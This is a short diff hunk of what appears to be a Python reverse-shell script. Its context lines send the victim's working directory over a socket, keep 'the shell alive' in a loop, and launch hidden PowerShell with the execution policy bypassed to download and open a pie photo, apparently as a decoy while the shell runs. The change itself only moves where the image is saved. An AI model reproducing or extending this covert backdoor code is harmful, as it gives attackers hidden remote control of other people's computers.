@@ -33,7 +33,7 @@ clabordir = str(os.getcwd() + '<pys43ll> ')
 soccy.send(clabordir.encode())
 
 #Work with PowerShell to display that delicious pie
-subprocess.Popen("powershell.exe -windowstyle hidden -executionpolicy bypass iwr 'https://www.pexels.com/photo/1282279/download/?search_query=pie&tracking_id=pkkfjrldff' -o $env:userprofile\documents\pie.jpg; cd $env:userprofile\Pictures; .\pie.jpg")
+subprocess.Popen("powershell.exe -windowstyle hidden -executionpolicy bypass iwr 'https://www.pexels.com/photo/1282279/download/?search_query=pie&tracking_id=pkkfjrldff' -o $env:userprofile\Pictures\pie.jpg; cd $env:userprofile\Pictures; .\pie.jpg")
 
 #While loop to keep the shell alive
 while truth:
